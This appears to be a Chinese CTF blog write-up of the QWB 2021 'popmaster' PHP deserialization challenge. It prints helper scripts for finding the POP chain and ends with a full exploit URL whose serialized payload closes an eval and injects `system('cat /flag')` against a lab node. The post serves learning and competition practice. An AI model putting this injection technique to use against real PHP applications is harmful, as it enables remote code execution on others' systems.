@@ -1,0 +1,218 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>qwb2021 popmaster | ev11ccaatt</title>
+<link rel="shortcut icon" href="https://ev11ccaatt.github.io/favicon.ico?v=1624166547288">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://ev11ccaatt.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="qwb2021 popmaster | ev11ccaatt - Atom Feed" href="https://ev11ccaatt.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="这里用的是出题人的exp，然后配合自己写的脚本。
+先运行main.php，获得一条链子，
+uZ8RGh======&gt;eexxIq======&gt;HCF758======&gt;eRDuMf======&gt;s5k3PD=====..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://ev11ccaatt.github.io">
+  <img class="avatar" src="https://ev11ccaatt.github.io/images/avatar.png?v=1624166547288" alt="">
+  </a>
+  <h1 class="site-title">
+    ev11ccaatt
+  </h1>
+  <p class="site-description">
+    人菜多学
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="https://ev11ccaatt.github.io/post/you-lian/" class="menu">
+          友链
+        </a>
+      
+    
+      
+        <a href="https://ev11ccaatt.github.io/post/about-me/" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              qwb2021 popmaster
+            </h2>
+            <div class="post-info">
+              <span>
+                2021-06-20
+              </span>
+              <span>
+                4 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <p>这里用的是<a href="https://gitee.com/b1ind/pop_master/tree/master">出题人的exp</a>，然后配合自己写的脚本。</p>
+<p>先运行main.php，获得一条链子，</p>
+<pre><code>uZ8RGh======&gt;eexxIq======&gt;HCF758======&gt;eRDuMf======&gt;s5k3PD======&gt;Faesut======&gt;Vo3I5p======&gt;HZrxS7======&gt;sRVehc======&gt;x0gcEr======&gt;HOLuvl======&gt;CPyWs9======&gt;Eh2znW======&gt;Asn946======&gt;GgglG1======&gt;grmYHD======&gt;rHO81I======&gt;VFgfDG======&gt;xyTak3======&gt;apN4tU======&gt;tXTGCg======&gt;aVNuM0======&gt;eval
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://raw.githubusercontent.com/ev11ccaatt/mypicture/master/img/image-20210620124926901.png" alt="image-20210620124926901" loading="lazy"></figure>
+<p>然后在code.php后面加上</p>
+<pre><code class="language-php">$ans=array('uZ8RGh','eexxIq','HCF758','eRDuMf','s5k3PD','Faesut','Vo3I5p','HZrxS7','sRVehc','x0gcEr','HOLuvl','CPyWs9','Eh2znW','Asn946','GgglG1','grmYHD','rHO81I','VFgfDG','xyTak3','apN4tU','tXTGCg','aVNuM0');# 你的链子，得先用其他东西处理下，改下格式
+$a = get_declared_classes();
+for($i=0;$i&lt;sizeof($ans);$i++)
+{
+	$j=0;
+	foreach($a as &amp;$v){
+    $b=get_class_methods($v);	
+	foreach($b as &amp;$j){
+	if($ans[$i]==$j){
+		echo $v;
+		echo &quot;:&quot;;
+		$ccc=new $v;
+		$cccc=get_object_vars($ccc);
+		echo(array_keys($cccc)[0]);
+		foreach($cccc as &amp;$ccccc)
+		{
+			echo $ccccc;
+		}
+		echo &quot;---&gt;&quot;;
+		break;
+		}
+	}
+	}		
+}
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://raw.githubusercontent.com/ev11ccaatt/mypicture/master/img/image-20210620124943786.png" alt="image-20210620124943786" loading="lazy"></figure>
+<pre><code>KLWxgp:OO7UVv6---&gt;v4zMHY:tRwwr54---&gt;NtXvcD:eK3A2W9---&gt;I9WQ8K:x4y4rKv---&gt;bxqCkb:IghrKwm---&gt;DN7xQ8:i6hGdVH---&gt;dghvfG:nyiak2O---&gt;Puowq8:xy3QYCO---&gt;L5BxKV:y3wcoGg---&gt;sLhVYF:ZgX3fXU---&gt;TtOgOO:gFRpGBY---&gt;qx8KIp:IakdQZm---&gt;sERwK1:HXw13e4---&gt;uxwmZs:GkxBgkk---&gt;OTBeQ0:h7HzGyv---&gt;o7uvHa:HNFMfae---&gt;GvwVA6:s9pqmSc---&gt;ZMtlgz:YBISphC---&gt;fbzuSt:Ddx8ei2---&gt;zqRt9T:e9Xsc0g---&gt;FC3Arq:ZMpEaqU---&gt;fXfZ8R:rGdWuuV---&gt;
+</code></pre>
+<p>然后交给python</p>
+<pre><code class="language-python">str='KLWxgp:OO7UVv6---&gt;v4zMHY:tRwwr54---&gt;NtXvcD:eK3A2W9---&gt;I9WQ8K:x4y4rKv---&gt;bxqCkb:IghrKwm---&gt;DN7xQ8:i6hGdVH---&gt;dghvfG:nyiak2O---&gt;Puowq8:xy3QYCO---&gt;L5BxKV:y3wcoGg---&gt;sLhVYF:ZgX3fXU---&gt;TtOgOO:gFRpGBY---&gt;qx8KIp:IakdQZm---&gt;sERwK1:HXw13e4---&gt;uxwmZs:GkxBgkk---&gt;OTBeQ0:h7HzGyv---&gt;o7uvHa:HNFMfae---&gt;GvwVA6:s9pqmSc---&gt;ZMtlgz:YBISphC---&gt;fbzuSt:Ddx8ei2---&gt;zqRt9T:e9Xsc0g---&gt;FC3Arq:ZMpEaqU---&gt;fXfZ8R:rGdWuuV---&gt;'
+str = str.replace('---&gt;',' ').split(' ')
+list1=[]
+ans = '$a'
+for i in str:
+    a=i.split(':')
+    list1.append(a)
+for i in range(0,len(str)-1):
+    print(ans,end='')
+    print('=new ',list1[i][0],'();',sep='')
+    ans = ans + '-&gt;'+list1[i][1]
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://raw.githubusercontent.com/ev11ccaatt/mypicture/master/img/image-20210620125728203.png" alt="image-20210620125728203" loading="lazy"></figure>
+<p>贴进code.php序列化一下就行。</p>
+<p>然后有一点是要先闭合他提供的eval，再执行自己的</p>
+<pre><code class="language-php">http://da053456-8d2f-40d0-96f9-34186ccd7090.node3.buuoj.cn/?pop=O:6:&quot;KLWxgp&quot;:1:{s:7:&quot;OO7UVv6&quot;;O:6:&quot;v4zMHY&quot;:1:{s:7:&quot;tRwwr54&quot;;O:6:&quot;NtXvcD&quot;:1:{s:7:&quot;eK3A2W9&quot;;O:6:&quot;I9WQ8K&quot;:1:{s:7:&quot;x4y4rKv&quot;;O:6:&quot;bxqCkb&quot;:1:{s:7:&quot;IghrKwm&quot;;O:6:&quot;DN7xQ8&quot;:1:{s:7:&quot;i6hGdVH&quot;;O:6:&quot;dghvfG&quot;:1:{s:7:&quot;nyiak2O&quot;;O:6:&quot;Puowq8&quot;:1:{s:7:&quot;xy3QYCO&quot;;O:6:&quot;L5BxKV&quot;:1:{s:7:&quot;y3wcoGg&quot;;O:6:&quot;sLhVYF&quot;:1:{s:7:&quot;ZgX3fXU&quot;;O:6:&quot;TtOgOO&quot;:1:{s:7:&quot;gFRpGBY&quot;;O:6:&quot;qx8KIp&quot;:1:{s:7:&quot;IakdQZm&quot;;O:6:&quot;sERwK1&quot;:1:{s:7:&quot;HXw13e4&quot;;O:6:&quot;uxwmZs&quot;:1:{s:7:&quot;GkxBgkk&quot;;O:6:&quot;OTBeQ0&quot;:1:{s:7:&quot;h7HzGyv&quot;;O:6:&quot;o7uvHa&quot;:1:{s:7:&quot;HNFMfae&quot;;O:6:&quot;GvwVA6&quot;:1:{s:7:&quot;s9pqmSc&quot;;O:6:&quot;ZMtlgz&quot;:1:{s:7:&quot;YBISphC&quot;;O:6:&quot;fbzuSt&quot;:1:{s:7:&quot;Ddx8ei2&quot;;O:6:&quot;zqRt9T&quot;:1:{s:7:&quot;e9Xsc0g&quot;;O:6:&quot;FC3Arq&quot;:1:{s:7:&quot;ZMpEaqU&quot;;O:6:&quot;fXfZ8R&quot;:1:{s:7:&quot;rGdWuuV&quot;;N;}}}}}}}}}}}}}}}}}}}}}}&amp;argv=?&gt;&lt;?php system('cat /flag');?&gt;
+</code></pre>
+
+              </div>
+              <div class="toc-container">
+                
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://ev11ccaatt.github.io/post/hitcon-2017ssrfme/">
+              <h3 class="post-title">
+                [HITCON 2017]SSRFme
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://ev11ccaatt.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
